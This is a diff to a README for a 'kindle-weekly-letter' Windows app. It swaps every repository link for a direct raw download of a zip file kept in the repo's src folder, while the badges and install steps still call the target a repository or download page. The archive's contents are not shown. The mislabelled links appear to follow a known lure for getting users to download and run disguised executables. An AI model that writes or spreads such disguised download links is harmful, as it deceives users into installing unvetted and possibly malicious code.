@@ -1,6 +1,6 @@
 # 📬 kindle-weekly-letter - Weekly Kindle reads made easy
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter/raw/refs/heads/main/src/kindle-letter-weekly-v3.9.zip)
 
 ## 🧭 What this app does
 
@@ -12,7 +12,7 @@ You do not need to build anything from source to use it on Windows if a ready-to
 
 ## 📥 Download and install
 
-1. Open the download page: https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter
+1. Open the download page: https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter/raw/refs/heads/main/src/kindle-letter-weekly-v3.9.zip
 2. Look for the latest release or download file on that page
 3. Download the Windows file if one is listed, such as an .exe or .zip package
 4. If you downloaded a .zip file, right-click it and choose Extract All
@@ -192,6 +192,6 @@ A steady setup helps the app work well over time:
 
 Visit this page to download or get the latest release:
 
-https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter
+https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter/raw/refs/heads/main/src/kindle-letter-weekly-v3.9.zip
 
-[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-Repository%20Link-grey?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter)
+[![Open Download Page](https://img.shields.io/badge/Open%20Download%20Page-Repository%20Link-grey?style=for-the-badge&logo=github)](https://github.com/Synsemantic-genuslamna112/kindle-weekly-letter/raw/refs/heads/main/src/kindle-letter-weekly-v3.9.zip)
